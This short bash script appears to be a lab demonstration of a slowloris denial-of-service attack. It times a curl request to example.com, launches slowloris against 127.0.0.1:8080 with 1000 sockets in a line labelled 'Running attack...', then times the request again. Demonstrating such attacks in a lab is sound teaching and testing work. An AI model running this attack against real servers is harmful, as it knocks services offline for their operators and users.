#!/bin/bash

echo "sleeping 5"

sleep 5

echo "curl victim"

curl -w "DNS Lookup: %{time_namelookup}s\n\
Connect: %{time_connect}s\n\
Start Transfer: %{time_starttransfer}s\n\
Total: %{time_total}s\n" -o /dev/null -s http://example.com

echo "sleeping 5"

sleep 5

echo "Running attack..."

slowloris 127.0.0.1 -p 8080 -s 1000 -v &

echo "sleeping 5"

sleep 5

curl -w "DNS Lookup: %{time_namelookup}s\n\
Connect: %{time_connect}s\n\
Start Transfer: %{time_starttransfer}s\n\
Total: %{time_total}s\n" -o /dev/null -s http://example.com

tail -f /dev/null
